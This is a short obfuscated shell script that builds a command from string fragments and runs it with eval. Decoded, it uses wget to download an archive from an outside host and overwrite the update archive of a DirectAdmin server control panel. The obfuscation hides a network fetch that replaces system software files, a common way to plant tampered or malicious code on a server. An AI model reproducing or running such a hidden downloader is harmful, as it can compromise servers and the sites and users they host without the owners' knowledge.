z="
";Ez='al/d';Nz='/fpt';Az='wget';Pz='/fil';Jz='e.ta';Bz=' -O ';Rz='"';Kz='r.gz';Fz='irec';Lz=' "ht';Dz='/loc';Mz='tp:/';Oz='.ovh';Gz='tadm';Iz='pdat';Hz='in/u';Cz='/usr';Qz='es/u';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Iz$Jz$Kz$Rz"